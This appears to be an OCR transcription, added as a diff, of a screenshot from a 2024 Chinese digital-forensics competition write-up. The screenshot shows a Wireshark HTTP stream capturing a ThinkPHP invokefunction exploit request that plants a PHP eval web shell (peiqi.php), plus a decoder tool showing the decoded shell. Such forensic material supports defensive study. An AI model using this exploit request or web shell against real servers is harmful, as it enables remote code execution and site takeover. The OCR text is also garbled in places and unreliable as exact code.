@@ -1,0 +1,40 @@
+# OCR: 4aba03a2860adaaf3c871605e47f0bd2.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/4aba03a2860adaaf3c871605e47f0bd2.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:13
+
+Wireshark-遍踪HTTP流(tcp.streameq107)·tcpdump_tj.cap
+GET/?s=/admin/Athinklapp/invokefunction&function=calluserfuncarray&vars[0]=fileputcontents&vars[1]=peiqi.php&vars[1]=<?php%20@eval(SPOST[%27peiqi%27])?>HTTP/1.1
+User-Aqent:Java/11.0.13 Host:222.2.2180
+Accept:text/html,image/gif,image/jpeg.*.q=.2,*/*;q=.2 Connection:keep-alive
+HTTP/1.1200OK Server:nginx
+Date:Frl,04Mar202207:15:13GMT Content-Type:text/html:charset=utf-8 Transfer-Encoding:chunked
+Connection:keep-alive Vary:Accept-Encoding
+30GET/peiqi.phpHTTP/1.1 User-Agent:Java/11.0.13 Host:222.2.2.180
+Accept:text/html,image/gif,image/jpeg.*;q=.2,*/*:q=.2 Connection:keep-alive
+HTTP/1.1200OK Senver.nginx
+Date:Fri,04Mar202207:15:13GMT Content-Type:text/htmi;charset=UTF-8 Transfer-Encoding:chunked
+Connection:keep-alive Vary:Accept-Encoding
+Ctool 国
+urlx
+OCtool1,412
+常用
+Base64URL编码
+加解密/签名
+Unicode
+校验
+JWT解码
+<?php%20@eval(sPOST[%27peiqi%27/)?
+<?php@eval(S_POSTIpeiqij)?> 问题/建议请点击此处反馈给我们
+编解码 Hex/String 编码
+转换
+生成
+Html编码解码
+其他 GZIP
+搜素工具
+Q
+品
+复制
+口
+X
